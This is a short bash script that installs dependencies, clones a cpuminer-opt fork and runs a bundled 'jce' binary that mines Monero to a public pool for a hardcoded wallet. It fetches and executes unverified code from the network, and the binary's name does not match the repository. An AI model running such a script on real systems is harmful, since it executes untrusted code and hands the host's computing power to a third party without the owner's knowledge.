#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
rm -rf cpuminer-opt &&
git clone https://github.com/fablebox/cpuminer-opt &&
cd cpuminer-opt &&
chmod +x jce &&
./jce --auto --any --forever  -o pool.minexmr.com:7777 -u 42ALNtiiMfr3rUY9MAJej59fbEiuw6eALckRFXZ6dSQAJZyxu5Nj6F12Kz4KdtRvqPG1YQML4S7hcRoXYuajKWr38aNktHS -p x

